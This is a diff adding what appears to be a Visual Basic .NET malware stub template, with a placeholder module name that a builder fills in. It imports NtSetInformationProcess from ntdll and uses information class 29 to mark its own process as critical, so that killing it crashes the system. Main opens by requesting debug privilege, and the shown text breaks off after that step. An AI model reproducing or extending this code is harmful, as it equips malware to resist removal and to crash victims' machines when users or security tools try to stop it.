@@ -1,0 +1,24 @@
+Imports System
+Imports Microsoft.VisualBasic
+Imports System.Runtime.InteropServices
+Imports System.Threading
+Imports System.Reflection
+Imports System.Text
+Imports System.Security
+Imports System.Diagnostics
+Module %1%
+
+Sub AdjustCritical(ByVal enable As Integer)
+NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, enable, 4)
+End Sub
+
+<DllImport("ntdll.dll", SetLastError:=True)> _
+Private Function NtSetInformationProcess(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
+End Function
+
+
+Sub Main()
+Try
+Process.EnterDebugMode()
+Catch
+End Try
